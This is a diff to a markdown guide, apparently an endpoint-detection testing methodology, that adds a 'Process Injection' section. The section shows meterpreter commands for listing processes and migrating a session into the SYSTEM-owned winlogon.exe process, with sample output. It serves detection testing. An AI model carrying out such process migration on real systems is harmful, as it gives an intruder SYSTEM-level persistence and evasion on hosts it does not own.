@@ -24,4 +24,34 @@ Upon successful execution of this test you should get a new meterpreter session 
 
 ![Lateral Session](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr9.png "Lateral Session")
 
+## Process Injection
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+```
+List Processes with ps
+```
+meterpreter > ps
+```
+Pick a process that has SYSTEM and is x64
+
+```
+Process List
+============
+
+ PID   PPID  Name                         Arch  Session  User                          Path
+ ---   ----  ----                         ----  -------  ----                          ----
+
+812   708   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+```
+
+Example winlogon.exe
+
+Run migrate with process id of target
+```
+meterpreter > migrate 812
+[*] Migrating from 7236 to 812...
+[*] Migration completed successfully.
+```
+
 
